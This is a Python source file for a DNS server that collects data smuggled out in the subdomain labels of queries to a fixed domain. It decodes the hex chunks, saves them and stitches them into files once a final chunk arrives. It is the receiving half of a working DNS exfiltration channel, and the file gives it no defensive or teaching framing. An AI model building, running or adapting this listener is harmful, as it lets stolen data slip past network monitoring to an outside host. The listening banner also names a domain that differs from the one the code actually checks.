import os
import binascii
import socketserver
from dnslib import DNSRecord, RR
from datetime import datetime

# New directory to store combined files
files_dir = "files"
if not os.path.exists(files_dir):
    os.makedirs(files_dir)

# Directory to store chunk files
chunk_dir = "chunks"
if not os.path.exists(chunk_dir):
    os.makedirs(chunk_dir)

# Function to generate a sort key for filenames
def hex_sort_key(filename):
    base, hex_num = os.path.splitext(filename)[0].split('_')[-1], 'ffff'
    return int(base, 16) if base != hex_num else float('inf')

# Modified combine_and_cleanup function to use files_dir for the combined file
def combine_and_cleanup(timestamp, chunk_dir, files_dir):
    pattern = f"{chunk_dir}/{timestamp.strftime('%Y-%m-%d_%H-%M-%S')}_*.bin"
    combined_filename = f"{files_dir}/{timestamp.strftime('%Y-%m-%d_%H-%M-%S')}_combined.bin"

    files = [f for f in os.listdir(chunk_dir) if f.endswith('.bin')]
    sorted_files = sorted(files, key=hex_sort_key)

    with open(combined_filename, 'wb') as outfile:
        for filename in sorted_files:
            filepath = os.path.join(chunk_dir, filename)
            with open(filepath, 'rb') as infile:
                outfile.write(infile.read())
            #os.remove(filepath) remove chunks

class BaseDNSHandler(socketserver.BaseRequestHandler):
    query_cache = {}  # Cache to store simple DNS responses for identical queries

    def handle(self):
        data, socket = self.request
        d = DNSRecord.parse(data)
        qname = str(d.q.qname)

        # Check cache first
        if qname in self.query_cache:
            # Send cached response
            socket.sendto(self.query_cache[qname], self.client_address)
            return

        domain = 'a.chromalin.com'
        if qname.endswith(domain + '.'):
            encoded_subdomain = qname.replace('.' + domain + '.', '').strip()
            subdomain_parts = encoded_subdomain.split('.')
            chunk_id_hex = subdomain_parts[-1]
            chunk_id = int(chunk_id_hex, 16)
            hex_data_segments = subdomain_parts[:-1]
            hex_data = ''.join(hex_data_segments)

            try:
                byte_data = binascii.unhexlify(hex_data)
                now = datetime.now()
                filename = f"{chunk_dir}/{now.strftime('%Y-%m-%d_%H-%M-%S')}_{chunk_id:04x}.bin"

                # Write the current chunk to a file
                with open(filename, "ab") as file:
                    file.write(byte_data)
                print(f"Created file {filename}")

                # If final chunk, combine files and move to 'files' directory
                if chunk_id == 0xFFFF:
                    print("got last chunk")
                    combine_and_cleanup(now, chunk_dir, files_dir)

                # Generate simple DNS response
                reply = d.reply()
                reply.add_answer(*RR.fromZone(f"{qname} 60 A 127.0.0.1"))
                response = reply.pack()
                socket.sendto(response, self.client_address)

                # Cache this response
                self.query_cache[qname] = response

            except (binascii.Error, ValueError) as e:
                print(f"Error processing data from {qname}: {e}")


class ThreadedDNSServer(socketserver.ThreadingMixIn, socketserver.UDPServer):
    pass

if __name__ == "__main__":
    server = ThreadedDNSServer(('', 53), BaseDNSHandler)
    try:
        print("Listening on port 53 for queries: <42data>.<62data>.<62data>.<62data>.<2id>.a.exampleee.com")
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        server.server_close()
